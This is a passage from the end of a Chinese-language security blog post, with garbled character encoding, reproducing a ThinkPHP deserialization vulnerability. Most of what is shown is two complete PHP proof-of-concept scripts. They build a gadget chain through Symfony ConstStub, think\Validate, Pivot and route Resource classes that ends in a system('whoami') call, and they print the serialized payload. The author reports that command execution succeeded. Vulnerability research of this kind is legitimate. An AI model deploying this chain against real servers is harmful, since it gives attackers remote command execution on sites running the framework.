</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Symfony\Component\VarDumper\Caster</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ConstStub</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">value</span><span class="o">=</span><span class="s2">&#34;whoami&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Validate</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$type</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;visible&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;system&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Route</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\model</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pivot</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$visible</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$hidden</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$append</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$relation</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nx">\Symfony\Component\VarDumper\Caster\ConstStub</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hidden</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;113&#39;</span><span class="o">=&gt;</span><span class="k">true</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;fupanc.111111&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">relation</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">\think\Validate</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\route</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Resource</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$rule</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$option</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$rest</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$router</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rule</span><span class="o">=</span><span class="s2">&#34;fupanc&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">router</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\Route</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;var&#34;</span><span class="o">=&gt;</span><span class="p">[</span><span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">\think\model\Pivot</span><span class="p">()],</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rest</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s2">&#34;111&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;id&gt;&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="s2">&#34;f&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\route</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ResourceRegister</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$registered</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$resource</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registered</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="s2">&#34;f&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\route\Resource</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\route\ResourceRegister</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">)));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆåŠŸå‘½ä»¤æ‰§è¡Œï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062244714.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306224438648"
	
	
></p>
<p>ç®€å•ä¼˜åŒ–äº†ä¸€ä¸‹POCï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Symfony\Component\VarDumper\Caster</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ConstStub</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">value</span><span class="o">=</span><span class="s2">&#34;whoami&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Validate</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$type</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;visible&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;system&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Route</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\model</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pivot</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$visible</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$hidden</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$append</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$relation</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nx">\Symfony\Component\VarDumper\Caster\ConstStub</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hidden</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;113&#39;</span><span class="o">=&gt;</span><span class="k">true</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;fupanc.111111&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">relation</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">\think\Validate</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\route</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Resource</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$rule</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$option</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$rest</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$router</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rule</span><span class="o">=</span><span class="s2">&#34;fupanc&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">router</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\Route</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;var&#34;</span><span class="o">=&gt;</span><span class="p">[</span><span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">\think\model\Pivot</span><span class="p">()],</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rest</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s2">&#34;111&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;id&gt;&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="s2">&#34;f&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\route</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ResourceRegister</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$registered</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$resource</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\route\Resource</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\route\ResourceRegister</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">)));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>â€”â€”â€”â€”â€”â€”</p>
<h5 id="æ€»ç»“-2">æ€»ç»“
</h5><p>interstingï¼Œvery interstingï¼Œä¸€åˆ‡éƒ½æ˜¯æœ€å¥½çš„å®‰æ’ï¼Œå¥½ç©å¥½ç©ã€‚</p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a class="link" href="https://xz.aliyun.com/news/14341"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/news/14341</a></p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
<p>Thinkphpçš„æ¼æ´è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œå…¶ä»–çš„å°±ä¸å¤ç°äº†ï¼Œè¿˜æƒ³å†å¤ç°çš„å¯ä»¥åœ¨æ¼æ´åº“æ‰¾æ‰¾ã€‚</p>
<p>æ³¨ï¼šæ¯ä¸€éƒ¨åˆ†çš„å‚è€ƒæ–‡ç« éƒ½æ˜¯ä¸åŒçš„ã€‚</p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
        
        

        <div class="article-details">
            <h2 class="article-title">phpstormè¿œç¨‹è°ƒè¯•ç¯å¢ƒæ­å»º</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/%E6%B5%85%E8%B0%88csp%E7%BB%95%E8%BF%87/">
        
        

        <div class="article-details">
            <h2 class="article-title">æµ…è°ˆCSPç»•è¿‡</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2025 Example Person
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
